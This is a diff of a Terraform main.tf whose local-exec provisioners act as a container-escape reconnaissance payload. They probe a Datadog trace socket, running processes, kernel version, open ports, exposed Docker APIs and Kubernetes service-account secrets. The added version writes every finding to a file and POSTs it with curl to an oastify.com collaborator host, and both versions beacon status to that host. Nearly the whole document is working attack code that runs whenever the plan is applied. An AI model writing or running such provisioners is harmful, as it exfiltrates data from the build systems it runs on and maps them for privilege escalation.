@@ -1,93 +1,97 @@
-# main.tf - Proper Datadog Socket Exploitation
-resource "null_resource" "datadog_socket_exploit" {
+# main.tf - Capture All Exploitation Results
+resource "null_resource" "capture_all_results" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== PROPER DATADOG SOCKET EXPLOITATION ==="
+      echo "=== COMPREHENSIVE EXPLOITATION RESULTS ===" > /tmp/full_results.txt
       
-      # 1. Test socket connectivity with Python
+      # 1. Datadog Socket Results
+      echo "=== DATADOG SOCKET TEST ===" >> /tmp/full_results.txt
       python3 -c "
       import socket
       import json
-      
       try:
           s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
           s.connect('/var/datadog/trace.sock')
-          print('DATADOG SOCKET CONNECTED - CRITICAL ACCESS')
-          
-          # Try to send trace data
-          trace_data = {
-              'traces': [[{
-                  'trace_id': 12345,
-                  'span_id': 67890,
-                  'name': 'test_span',
-                  'resource': 'test_resource',
-                  'service': 'test_service',
-                  'type': 'web',
-                  'start': 1000000000000000000,
-                  'duration': 1000000000,
-                  'meta': {'test': 'value'}
-              }]]
-          }
-          
+          print('SOCKET CONNECTED')
+          trace_data = {'traces': [[{'trace_id': 12345}]]}
           s.send(json.dumps(trace_data).encode() + b'\n')
           response = s.recv(1024)
-          print('Response:', response)
+          print('RESPONSE:', response.decode())
           s.close()
-          
       except Exception as e:
-          print('Socket error:', e)
-      "
+          print('ERROR:', str(e))
+      " >> /tmp/full_results.txt 2>&1
       
-      # 2. Check if we can find running Datadog processes
-      echo "=== DATADOG PROCESS CHECK ==="
-      ps aux | head -20
+      # 2. Process List
+      echo "=== RUNNING PROCESSES ===" >> /tmp/full_results.txt
+      ps aux >> /tmp/full_results.txt
       
-      # 3. Look for Datadog configuration
-      echo "=== DATADOG CONFIG SEARCH ==="
-      find /etc /opt /var -name "*datadog*" -type f 2>/dev/null | head -10
+      # 3. Kernel Info
+      echo "=== KERNEL INFORMATION ===" >> /tmp/full_results.txt
+      uname -a >> /tmp/full_results.txt
+      cat /proc/version >> /tmp/full_results.txt
       
-      # 4. Check socket permissions in detail
-      echo "=== SOCKET PERMISSIONS ==="
-      ls -la /var/datadog/trace.sock
-      stat /var/datadog/trace.sock 2>/dev/null
+      # 4. Network Services
+      echo "=== NETWORK SERVICES ===" >> /tmp/full_results.txt
+      netstat -tulpn 2>/dev/null >> /tmp/full_results.txt || ss -tulpn 2>/dev/null >> /tmp/full_results.txt
       
-      curl -X POST -d "datadog_socket_tested=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/datadog_socket
+      # 5. Docker API Check
+      echo "=== DOCKER API CHECK ===" >> /tmp/full_results.txt
+      for port in 2375 2376; do
+        curl -s http://172.17.0.1:$port/version >> /tmp/full_results.txt 2>&1 && echo "DOCKER API PORT $port OPEN" >> /tmp/full_results.txt || true
+      done
+      
+      # 6. Kubernetes Check
+      echo "=== KUBERNETES CHECK ===" >> /tmp/full_results.txt
+      ls -la /var/run/secrets/kubernetes.io/ >> /tmp/full_results.txt 2>&1
+      
+      # 7. Send ALL results to collaborator
+      curl -X POST --data-binary @/tmp/full_results.txt http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/full_results
+      
+      echo "All results sent"
     EOT
   }
 }
 
-resource "null_resource" "alternative_escape" {
+resource "null_resource" "critical_findings_summary" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "=== ALTERNATIVE ESCAPE VECTORS ==="
+      echo "=== CRITICAL FINDINGS SUMMARY ==="
       
-      # Since Datadog socket might not be active, let's try other critical attacks
+      # Check for the most critical evidence
+      CRITICAL_COUNT=0
       
-      # 1. Kernel exploit check for 4.4.0
-      echo "=== KERNEL 4.4.0 EXPLOITS ==="
-      uname -a
-      # Linux 4.4.0 has known exploits like Dirty COW
+      # 1. Check if Datadog socket is connectable
+      if python3 -c "import socket; s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect('/var/datadog/trace.sock'); print('connected')" 2>/dev/null; then
+        echo "CRITICAL: Datadog socket accessible"
+        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
+      fi
       
-      # 2. Check for any writable system files
-      echo "=== WRITABLE SYSTEM FILES ==="
-      find /etc -writable -type f 2>/dev/null | head -10
-      find /usr -writable -type f 2>/dev/null | head -10
+      # 2. Check for Docker API
+      if curl -s http://172.17.0.1:2375/version 2>/dev/null; then
+        echo "CRITICAL: Docker API exposed"
+        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
+      fi
       
-      # 3. Check for shared memory attacks
-      echo "=== SHARED MEMORY ==="
-      ls -la /dev/shm/
-      ipcs -a 2>/dev/null
+      # 3. Check for Kubernetes
+      if [ -d "/var/run/secrets/kubernetes.io/serviceaccount" ]; then
+        echo "CRITICAL: Kubernetes environment"
+        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
+      fi
       
-      # 4. Check for any exposed Docker APIs
-      echo "=== DOCKER API CHECK ==="
-      curl -s http://172.17.0.1:2375/version 2>/dev/null && echo "DOCKER API EXPOSED - CRITICAL"
-      curl -s http://172.17.0.1:2376/version 2>/dev/null && echo "DOCKER TLS API EXPOSED"
+      # 4. Check for privileged capabilities
+      if [ -w /dev/kmsg ]; then
+        echo "CRITICAL: Privileged container"
+        CRITICAL_COUNT=$((CRITICAL_COUNT+1))
+      fi
       
-      # 5. Check for Kubernetes access
-      echo "=== KUBERNETES CHECK ==="
-      ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && echo "KUBERNETES ENVIRONMENT - CRITICAL"
+      echo "TOTAL CRITICAL FINDINGS: $CRITICAL_COUNT"
       
-      curl -X POST -d "alternative_escape_checked=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/escape_vectors
+      if [ $CRITICAL_COUNT -gt 0 ]; then
+        curl -X POST -d "critical_findings=true" -d "count=$CRITICAL_COUNT" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/critical_summary
+      else
+        curl -X POST -d "no_critical_findings=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/no_critical
+      fi
     EOT
   }
 }
